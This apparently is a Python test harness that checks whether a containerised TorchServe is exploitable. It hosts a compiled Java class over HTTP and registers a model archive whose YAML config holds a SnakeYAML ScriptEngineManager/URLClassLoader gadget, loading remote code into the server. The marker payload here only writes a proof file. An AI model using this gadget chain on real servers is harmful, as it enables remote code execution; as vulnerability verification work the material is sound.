"""Real JDK, vendor YAML reader and MAR-registration controls; no owner payload."""
from datetime import datetime, timezone
from pathlib import Path
import base64
import functools
import hashlib
import http.server
import io
import json
import os
import subprocess
import threading
import urllib.error
import urllib.parse
import urllib.request
import zipfile


class Native:
    JAR = '/home/venv/lib/python3.9/site-packages/ts/frontend/model-server.jar'
    WORK = '/home/model-server/tmp/module-target-native'
    PROOF = '/tmp/module-target-torchserve-native-proof'

    def __init__(self):
        self.runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
        self.version = os.environ['TORCHSERVE_VERSION']
        self.vendor = json.loads(Path(__file__).with_name('vendor.json').read_text())[self.version]
        self.out = Path(self.runtime['artifacts']) / 'torchserve-native'
        self.out.mkdir()
        self.receipt = dict(version=self.version, commands=[], http=[], proofs=[], source_requests=[])
        self.server = None
        self.thread = None
        self.archives = []

    def save(self):
        (self.out / 'receipt.json').write_text(json.dumps(self.receipt, indent=2) + '\n')

    def execute(self, label, *args):
        argv = self.runtime['compose'] + ['exec', '-T', 'target', *args]
        result = subprocess.run(argv, capture_output=True, timeout=45)
        self.receipt['commands'].append(dict(label=label, argv=argv, exit=result.returncode,
                                            stdout_base64=base64.b64encode(result.stdout).decode(),
                                            stderr_base64=base64.b64encode(result.stderr).decode()))
        self.save()
        if result.returncode:
            raise RuntimeError(label + ': ' + result.stderr.decode(errors='replace'))
        return result.stdout

    def file(self, label, path):
        code = ("import pathlib,base64,json,sys;p=pathlib.Path(sys.argv[1]);"
                "print(json.dumps({'exists':True,'uid':p.stat().st_uid,'base64':base64.b64encode(p.read_bytes()).decode()}"
                " if p.exists() else {'exists':False}))")
        return json.loads(self.execute(label, 'python', '-c', code, path))

    def clear_proof(self):
        self.execute('remove-native-proof', 'rm', '-f', '--', self.PROOF)
        assert self.file('proof-absent', self.PROOF) == {'exists': False}

    def proof(self, label, expected, pid=None):
        value = self.file(label, self.PROOF)
        self.receipt['proofs'].append(dict(label=label, expected=expected, observed=value))
        self.save()
        if expected:
            assert value['exists'] and value['uid'] == 1000, value
            lines = base64.b64decode(value['base64']).decode().splitlines()
            assert len(lines) == 1, lines
            fields = lines[0].split(':')
            assert len(fields) == 3 and fields[0] == 'torchserve-native' and fields[1].isdigit() and fields[2] == 'model-server', lines
            if pid is not None:
                assert int(fields[1]) == pid, (fields, pid)
            return int(fields[1])
        assert value == {'exists': False}, value
        return None

    def http(self, label, path, method='GET', query=None):
        endpoint = self.runtime['endpoints']['target']
        url = 'http://' + endpoint['host'] + ':' + str(endpoint['port']) + path
        if query:
            url += '?' + urllib.parse.urlencode(query)
        request = urllib.request.Request(url, method=method)
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        try:
            response = opener.open(request, timeout=30)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            body = response.read()
            row = dict(label=label, path=path, method=method, query=query, code=response.status,
                       headers=dict(response.headers.items()), body_base64=base64.b64encode(body).decode())
        self.receipt['http'].append(row)
        self.save()
        return row['code'], json.loads(body)

    def models(self, label):
        status, body = self.http(label, '/models')
        assert status == 200, body
        return body['models']

    def native(self, label, mode, value):
        # Use the installed vendor reader, including its real SnakeYAML version.
        raw = self.execute(label, 'env', 'JAVA_TOOL_OPTIONS=-Xmx128m -XX:ActiveProcessorCount=2',
                           'java', '-cp', self.JAR + ':' + self.WORK + '/probe', 'NativeProbe', mode, value)
        result = json.loads(raw)
        assert result['user'] == 'model-server' and result['java'] == self.vendor['java'], result
        assert result['vendor'] == 'file:' + self.JAR, result
        return result

    def archive(self, name, configuration):
        manifest = dict(createdOn=datetime.now().strftime('%d/%m/%Y %H:%M:%S'), runtime='python',
                        model=dict(modelName=name, serializedFile='weights.pt', handler='native_handler.py',
                                   modelVersion='1.0', configFile='native.yml'), archiverVersion=self.version)
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, 'w', compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr('MAR-INF/MANIFEST.json', json.dumps(manifest))
            archive.writestr('weights.pt', b'')
            archive.writestr('native.yml', configuration)
            archive.writestr('native_handler.py', 'def handle(data, context):\n    return data\n')
        path = self.http_root / (name + '.mar')
        path.write_bytes(stream.getvalue())
        self.archives.append('/home/model-server/model-store/' + path.name)
        return path

    def verify(self):
        try:
            assert self.models('models-before') == []
            code, api = self.http('api-description', '/api-description')
            assert code == 200 and api['info']['title'] == 'TorchServe APIs' and api['info']['version'] == self.version, api
            self.receipt['api_info'] = api['info']
            before = self.execute('jar-before', 'sha256sum', self.JAR).decode().split()[0]
            assert before == self.vendor['jar_sha256'], before
            self.execute('compile-directories', 'mkdir', '-p', self.WORK + '/classes', self.WORK + '/probe')
            for name, destination, classpath in [('NativeScriptEngineFactory', 'classes', []), ('NativeProbe', 'probe', ['-cp', self.JAR])]:
                self.execute('compile-' + name, 'env', 'JAVA_TOOL_OPTIONS=-Xmx128m -XX:ActiveProcessorCount=2',
                             'javac', *classpath, '-d', self.WORK + '/' + destination, '/opt/module-target/' + name + '.java')
            self.http_root = self.out / 'http'
            (self.http_root / 'META-INF/services').mkdir(parents=True)
            (self.http_root / 'META-INF/services/javax.script.ScriptEngineFactory').write_text('NativeScriptEngineFactory\n')
            factory = self.execute('read-compiled-factory', 'cat', self.WORK + '/classes/NativeScriptEngineFactory.class')
            (self.http_root / 'NativeScriptEngineFactory.class').write_bytes(factory)
            journal = self.receipt['source_requests']

            class Source(http.server.SimpleHTTPRequestHandler):
                def log_request(self, code='-', size='-'):
                    journal.append(dict(path=self.path, code=code, at=datetime.now(timezone.utc).isoformat()))

                def log_message(self, *arguments):
                    pass

            self.server = http.server.ThreadingHTTPServer(('0.0.0.0', 0), functools.partial(Source, directory=str(self.http_root)))
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            host = self.execute('native-host-route', 'python', '-c', "import socket;print(socket.gethostbyname('host.docker.internal'))").decode().strip()
            origin = 'http://' + host + ':' + str(self.server.server_port) + '/'
            self.receipt['origin'] = origin
            self.clear_proof()
            value = self.native('direct-constructor', 'constructor', 'file:' + self.WORK + '/classes/')
            assert value['completed'] and value['class'] == 'NativeScriptEngineFactory', value
            self.proof('direct-constructor', True, value['pid'])
            self.clear_proof()
            value = self.native('remote-service-loader', 'service', origin)
            assert value['completed'] and value['factories'] == 1, value
            self.proof('remote-service-loader', True, value['pid'])
            self.clear_proof()
            configurations = {'plain': 'minWorkers: 0\nmaxWorkers: 1\n',
                              'unsafe': '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["' + origin + '"]]]]\n'}
            for label, configuration in configurations.items():
                path = self.WORK + '/' + label + '.yml'
                self.execute(label + '-write-yaml', 'python', '-c', 'import pathlib,sys;pathlib.Path(sys.argv[1]).write_text(sys.argv[2])', path, configuration)
                value = self.native(label + '-vendor-yaml', 'yaml', path)
                expected = label == 'unsafe' and self.version == '0.8.1'
                if label == 'plain':
                    assert value['completed'] and value['value'] == {'minWorkers': 0, 'maxWorkers': 1}, value
                else:
                    assert not value['completed'] and value['errors'][0]['type'] == self.vendor['yaml_failure'], value
                    if not expected:
                        assert any('Global tag is not allowed' in item['message'] for item in value['errors']), value
                self.receipt[label + '_vendor_yaml'] = value
                self.proof(label + '-vendor-yaml', expected, value['pid'])
                self.clear_proof()
                name = 'module_target_torchserve_' + str(os.getpid()) + '_' + label
                archive = self.archive(name, configuration)
                offset = len(journal)
                status, body = self.http(label + '-register', '/models', 'POST',
                                         {'url': origin + archive.name, 'initial_workers': '0', 'synchronous': 'true'})
                # A 500 can follow successful constructor execution; a 200 on
                # the fixed image can follow a caught YAML rejection.
                pid = self.proof(label + '-http-yaml', expected)
                if expected:
                    assert status == 500 and body['type'] == 'ClassCastException', (status, body)
                    process = self.execute('proof-server-identity', 'python', '-c',
                                           "import pathlib,sys;print((pathlib.Path('/proc')/sys.argv[1]/'cmdline').read_bytes().decode().replace('\\0',' '))", str(pid)).decode()
                    assert 'org.pytorch.serve.ModelServer' in process, process
                    self.receipt['server_proof'] = dict(pid=pid, command=process)
                else:
                    assert status == 200, (status, body)
                assert journal[offset:] and journal[offset:][0]['path'] == '/' + archive.name, journal[offset:]
                stored = self.file(label + '-downloaded-mar', self.archives[-1])
                assert stored['uid'] == 1000 and base64.b64decode(stored['base64']) == archive.read_bytes(), stored
                registered = self.models(label + '-registered')
                assert [item['modelName'] for item in registered] == ([] if expected else [name]), registered
                deleted, _ = self.http(label + '-unregister', '/models/' + name + '/1.0', 'DELETE')
                assert deleted == (404 if expected else 200), deleted
                assert self.models(label + '-models-after') == []
                remaining = self.file(label + '-mar-after-unregister', self.archives[-1])
                assert remaining['exists'] == expected, remaining
                self.receipt[label + '_http'] = dict(status=status, body=body, models=registered,
                                                    delete_status=deleted, mar_after_delete=remaining,
                                                    archive_sha256=hashlib.sha256(archive.read_bytes()).hexdigest())
                self.clear_proof()
            after = self.execute('jar-after', 'sha256sum', self.JAR).decode().split()[0]
            assert after == before
            self.receipt['passed'] = True
            return self.receipt
        except BaseException as error:
            self.receipt['error'] = dict(type=type(error).__name__, message=str(error))
            raise
        finally:
            if self.server:
                self.server.shutdown()
                self.server.server_close()
                self.thread.join(5)
                self.receipt['source_closed'] = not self.thread.is_alive()
            # Native fixture recovery is explicit; it is not owner cleanup.
            self.execute('native-fixture-cleanup', 'rm', '-f', '--', self.PROOF, *self.archives)
            self.receipt['native_archives_removed'] = all(not self.file('archive-absent', path)['exists'] for path in self.archives)
            self.save()


if __name__ == '__main__':
    result = Native().verify()
    print(json.dumps(result))
